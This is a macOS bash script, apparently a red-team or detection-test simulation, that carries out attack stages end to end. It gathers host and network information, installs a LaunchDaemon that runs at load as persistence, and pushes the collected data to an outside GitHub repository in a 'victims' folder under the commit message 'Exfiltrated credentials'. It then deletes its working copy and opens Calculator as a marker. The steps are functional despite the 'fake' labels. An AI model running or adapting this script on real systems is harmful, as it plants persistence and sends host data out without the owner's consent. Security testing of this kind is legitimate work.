#!/bin/bash

# Simulated reconnaissance
whoami
uname -a
ifconfig > /tmp/netinfo.txt

# Simulated persistence (fake LaunchDaemon)
echo 'echo "Fake persistence ran!"' > /usr/local/bin/fake_persist.sh
chmod +x /usr/local/bin/fake_persist.sh

cat <<EOF > /Library/LaunchDaemons/com.fake.persistence.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
 "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.fake.persistence</string>
    <key>ProgramArguments</key>
    <array>
        <string>/usr/local/bin/fake_persist.sh</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
</dict>
</plist>
EOF

# Clone the repo (use your token for write access)
git clone https://<your-token>@github.com/<your-username>/CS-Test-1234.git repo-copy
cd repo-copy/victims

# Add and push the stolen data
mv /tmp/netinfo.txt .
git add netinfo.txt
git commit -m "Exfiltrated credentials"
git push

cd ../..
rm -rf repo-copy


# Visual indicator
open -a Calculator
